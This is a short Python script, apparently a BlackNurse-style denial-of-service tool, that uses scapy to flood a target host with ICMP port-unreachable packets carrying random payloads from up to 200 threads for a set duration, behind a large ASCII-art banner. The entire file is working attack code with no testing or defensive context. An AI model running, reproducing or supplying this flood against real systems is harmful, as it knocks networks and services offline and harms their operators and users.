import threading, sys, os, time
from random import randint
from scapy.all import *

def flood():
    host = sys.argv[2]
    duration = sys.argv[3]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:
            send(IP(dst=host)/ICMP(type=3,code=3)/Raw(os.urandom(randint(1024, 2048))),verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$  /$$        /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$   /$$ /$$$$$$$   /$$$$$$  /$$$$$$$$
            | $$                | $$          | $$__  $$| $$       /$$__  $$ /$$__  $$| $$  /$$/| $$$ | $$| $$  | $$| $$__  $$ /$$__  $$| $$_____/
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$ /$$/ | $$$$| $$| $$  | $$| $$  \ $$| $$  \__/| $$      
            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$ | $$      | $$$$$$$$| $$      | $$$$$/  | $$ $$ $$| $$  | $$| $$$$$$$/|  $$$$$$ | $$$$$   
            | $$      | $$  | $$| $$   /$$$$/ | $$__  $$| $$      | $$__  $$| $$      | $$  $$  | $$  $$$$| $$  | $$| $$__  $$ \____  $$| $$__/   
            | $$      | $$  | $$| $$  /$$__/  | $$  \ $$| $$      | $$  | $$| $$    $$| $$\  $$ | $$\  $$$| $$  | $$| $$  \ $$ /$$  \ $$| $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$$$$$$/| $$$$$$$$| $$  | $$|  $$$$$$/| $$ \  $$| $$ \  $$|  $$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$
            |________/ \______/ |__/|________/|_______/ |________/|__/  |__/ \______/ |__/  \__/|__/  \__/ \______/ |__/  |__/ \______/ |________/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')